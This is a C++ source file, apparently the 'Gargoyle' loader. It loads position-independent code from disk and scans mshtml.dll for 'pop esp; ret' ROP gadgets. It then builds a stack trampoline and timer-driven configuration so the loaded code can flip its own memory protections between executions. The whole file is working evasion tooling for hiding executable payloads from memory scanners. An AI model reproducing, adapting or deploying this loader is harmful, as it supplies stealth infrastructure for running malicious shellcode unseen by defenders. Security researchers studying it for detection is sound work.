#include <algorithm>
#include <fstream>
#include <tuple>
#include <vector>

#include <Windows.h>
#include <DbgHelp.h>
#include <winnt.h>

using namespace std;

namespace {
  typedef void(*callable)(void*);
  typedef tuple<void*, size_t> MyTuple;
  constexpr DWORD invocation_interval_ms = 15 * 1000;
  constexpr size_t stack_size = 0x10000;

  vector<vector<uint8_t>> rop_gadget_candidates = {
    { 0x59, 0x5C, 0xC3 },                   // pop ecx; pop esp; ret
    { 0x58, 0x5C, 0xC3 }                    // pop eax; pop esp; ret
  };

  struct SetupConfiguration {
    uint32_t initialized;
    void* setup_address;
    uint32_t setup_length;
    void* VirtualProtectEx;
    void* WaitForSingleObjectEx;
    void* CreateWaitableTimer;
    void* SetWaitableTimer;
    void* MessageBox;
    void* tramp_addr;
    void* sleep_handle;
    uint32_t interval;
    void* target;
    uint8_t shadow[8];
  };

  struct StackTrampoline {
    void* VirtualProtectEx;
    void* return_address;
    void* current_process;
    void* address;
    uint32_t size;
    uint32_t protections;
    void* old_protections_ptr;
    uint32_t old_protections;
    void* setup_config;
  };

  struct Workspace {
    SetupConfiguration config;
    uint8_t stack[stack_size];
    StackTrampoline tramp;
  };
}

Workspace& allocate_workspace() {
  auto result = VirtualAllocEx(GetCurrentProcess(), nullptr, sizeof(Workspace), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  if (!result) throw runtime_error("[-] Couldn't VirtualAllocEx: " + GetLastError());
  RtlSecureZeroMemory(result, sizeof(Workspace));
  return *static_cast<Workspace*>(result);
}

MyTuple allocate_pic(const string& filename) {
  fstream file_stream{ filename, fstream::in | fstream::ate | fstream::binary };
  if (!file_stream) throw runtime_error("[-] Couldn't open \"" + filename + "\".");
  auto pic_size = static_cast<size_t>(file_stream.tellg());
  file_stream.seekg(0, fstream::beg);
  auto pic = VirtualAllocEx(GetCurrentProcess(), nullptr, pic_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
  if (!pic) throw runtime_error("[-] Couldn't VirtualAllocEx: " + GetLastError());
  file_stream.read(static_cast<char*>(pic), pic_size);
  file_stream.close();
  DWORD old_protection;
  auto prot_result = VirtualProtectEx(GetCurrentProcess(), pic, pic_size, PAGE_EXECUTE_READ, &old_protection);
  if (!prot_result) throw runtime_error("[-] Couldn't VirtualProtectEx: " + GetLastError());
  return MyTuple(pic, pic_size);
}

void* get_system_dll_gadget(const string& system_dll_filename) {
  printf("[ ] Loading \"%s\" system DLL.\n", system_dll_filename.c_str());
  auto dll_base = reinterpret_cast<uint8_t*>(LoadLibraryA(system_dll_filename.c_str()));
  if (!dll_base) throw runtime_error("[-] Couldn't LoadLibrary: " + GetLastError());

  printf("[+] Loaded \"%s\" at 0x%p.\n", system_dll_filename.c_str(), dll_base);

  auto pe_header = ImageNtHeader(dll_base);
  if (!pe_header) throw runtime_error("[-] Couldn't ImageNtHeader: " + GetLastError());

  auto filtered_section_headers = vector<PIMAGE_SECTION_HEADER>();
  auto section_header = reinterpret_cast<PIMAGE_SECTION_HEADER>(pe_header + 1);
  for (int i = 0; i < pe_header->FileHeader.NumberOfSections; ++i)
  {
    if (section_header->Characteristics & IMAGE_SCN_MEM_EXECUTE) {
      filtered_section_headers.push_back(section_header);
      printf("[ ] Found executable section \"%s\" at 0x%p.\n", section_header->Name, dll_base + section_header->VirtualAddress);
    }
    section_header++;
  };

  for (auto section_header : filtered_section_headers)
  {
    for (auto rop_gadget : rop_gadget_candidates)
    {
      auto section_base = dll_base + section_header->VirtualAddress;
      vector<uint8_t> section_content(section_base, section_base + section_header->Misc.VirtualSize);
      auto search_result = search(begin(section_content), end(section_content), begin(rop_gadget), end(rop_gadget));
      if (search_result == end(section_content))
          continue;

      auto rop_gadget_offset = section_base + (search_result - begin(section_content));
      printf("[+] Found ROP gadget in section \"%s\" at 0x%p.\n", section_header->Name, rop_gadget_offset);
      return rop_gadget_offset;
    }
  }

  printf("[-] Didn't find ROP gadget in \"%s\".\n", system_dll_filename.c_str());
  return 0;
}

void* get_gadget(bool use_system_dll, const string& gadget_system_dll_filename, const string& gadget_pic_path) {
  void* memory;
  if (use_system_dll) {
    memory = get_system_dll_gadget(gadget_system_dll_filename);
  }
  if (!use_system_dll || !memory) {
    printf("[ ] Allocating executable memory for \"%s\".\n", gadget_pic_path.c_str());
    size_t size;
    tie(memory, size) = allocate_pic(gadget_pic_path);
    printf("[+] Allocated %u bytes for gadget PIC.\n", size);
  }
  return memory;
}

void launch(const string& setup_pic_path, const string& gadget_system_dll_filename, const string& gadget_pic_path) {
  printf("[ ] Allocating executable memory for \"%s\".\n", setup_pic_path.c_str());
  void* setup_memory; size_t setup_size;
  tie(setup_memory, setup_size) = allocate_pic(setup_pic_path);
  printf("[+] Allocated %d bytes for PIC.\n", setup_size);

  auto use_system_dll{ true };
  printf("[ ] Configuring ROP gadget.\n");
  auto gadget_memory = get_gadget(use_system_dll, gadget_system_dll_filename, gadget_pic_path);
  printf("[+] ROP gadget configured.\n");

  printf("[ ] Allocating read/write memory for config, stack, and trampoline.\n");
  auto& scratch_memory = allocate_workspace();
  auto& config = scratch_memory.config;
  auto& tramp = scratch_memory.tramp;
  printf("[+] Allocated %u bytes for scratch memory.\n", sizeof(scratch_memory));

  printf("[ ] Building stack trampoline.\n");
  tramp.old_protections_ptr = &tramp.old_protections;
  tramp.protections = PAGE_EXECUTE_READ;
  tramp.current_process = GetCurrentProcess();
  tramp.VirtualProtectEx = VirtualProtectEx;
  tramp.size = static_cast<uint32_t>(setup_size);
  tramp.address = setup_memory;
  tramp.return_address = setup_memory;
  tramp.setup_config = &config;
  printf("[+] Stack trampoline built.\n");

  printf("[ ] Building configuration.\n");
  config.setup_address = setup_memory;
  config.setup_length = static_cast<uint32_t>(setup_size);
  config.VirtualProtectEx = VirtualProtectEx;
  config.WaitForSingleObjectEx = WaitForSingleObjectEx;
  config.CreateWaitableTimer = CreateWaitableTimerW;
  config.SetWaitableTimer = SetWaitableTimer;
  config.MessageBox = MessageBoxA;
  config.tramp_addr = &tramp;
  config.interval = invocation_interval_ms;
  config.target = gadget_memory;
  printf("[+] Configuration built.\n");

  printf("[+] Success!\n");
  printf("    ================================\n");
  printf("    Gargoyle PIC @ -----> 0x%p\n", setup_memory);
  printf("    ROP gadget @ -------> 0x%p\n", gadget_memory);
  printf("    Configuration @ ----> 0x%p\n", &scratch_memory.config);
  printf("    Top of stack @ -----> 0x%p\n", &scratch_memory.stack);
  printf("    Bottom of stack @ --> 0x%p\n", &scratch_memory.stack[stack_size-1]);
  printf("    Stack trampoline @ -> 0x%p\n", &scratch_memory.tramp);

  reinterpret_cast<callable>(setup_memory)(&config);
}

int main() {
  try {
    launch("setup.pic", "mshtml.dll", "gadget.pic");
  } catch (exception& e) {
    printf("%s\n", e.what());
  }
}
